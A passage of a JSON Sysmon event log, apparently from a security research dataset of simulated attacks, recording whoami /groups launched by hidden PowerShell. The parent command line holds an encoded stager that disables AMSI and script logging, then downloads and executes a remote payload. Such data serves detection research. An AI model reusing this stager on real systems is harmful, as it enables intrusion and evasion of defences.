AKwAkAEsAKQApAHwASQBFAFgA","Product":"Microsoft® Windows® Operating System","Domain":"NT AUTHORITY","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","TerminalSessionId":"2","EventType":"INFO","ParentCommandLine":"\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA","Keywords":-9223372036854775808,"CurrentDirectory":"C:\\windows\\system32\\","CommandLine":"\"C:\\windows\\system32\\whoami.exe\" /groups","IntegrityLevel":"Medium","AccountName":"SYSTEM","EventID":1,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","ParentProcessId":"1376","ProcessId":"6692","ProcessGuid":"{3ddc5665-ed04-5f51-eb02-000000000500}","Description":"whoami - displays logged on user information","Hashes":"SHA1=8F1F9E265911956C7F8F3861C34DEF9B8FA63813,MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","AccountType":"User","ParentProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","Company":"Microsoft Corporation","ThreadID":4344,"RecordNumber":309574,"SeverityValue":2,"SourceModuleName":"eventlog","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Severity":"INFO","OriginalFileName":"whoami.exe","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process Create (rule: ProcessCreate)","EventReceivedTime":"2020-09-04 03:30:13","Task":1,"UtcTime":"2020-09-04 07:30:12.728","EventTime":"2020-09-04 03:30:12","LogonGuid":"{3ddc5665-e7e4-5f51-2d99-0a0000000000}","@timestamp":"2020-09-04T07:30:13.766Z","User":"THESHIRE\\pgustavo","tags":["mordorDataset"],"LogonId":"0xa992d","RuleName":"-","Image":"C:\\Windows\\System32\\whoami.exe"}
